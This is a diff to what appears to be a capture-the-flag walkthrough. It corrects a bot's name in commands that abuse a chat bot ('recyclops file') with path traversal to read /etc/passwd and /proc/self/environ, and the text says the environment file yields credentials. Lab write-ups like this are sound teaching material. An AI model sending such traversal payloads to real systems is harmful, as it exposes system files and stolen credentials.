@@ -92,11 +92,11 @@ After going through the employee's chats, we note that there's a bot in the syst
  
 
 ```
-reclops file ../../../../../etc/passwd
+recyclops file ../../../../../etc/passwd
 ```
 we can run the code below to check on the system's environment...
 ```
-reclops file ../../../../../proc/self/environ
+recyclops file ../../../../../proc/self/environ
 ```
 And we get some creds...
 ![Screenshot_2022-11-23_00_07_14](https://user-images.githubusercontent.com/99975622/207168981-d6d69328-30d2-43e9-9877-df6c3faaa4d1.png)
@@ -107,7 +107,7 @@ And we get some creds...
 
 We can also run the script as below adding the environment in the environ directory...
 ```
-reclops file ../../../../../proc/self/environ.env
+recyclops file ../../../../../proc/self/environ.env
 ```
 ![Screenshot_2022-11-23_00_07_35](https://user-images.githubusercontent.com/99975622/207169293-cb02a5c6-5861-41ea-9996-d1f60dd6e64e.png)
 
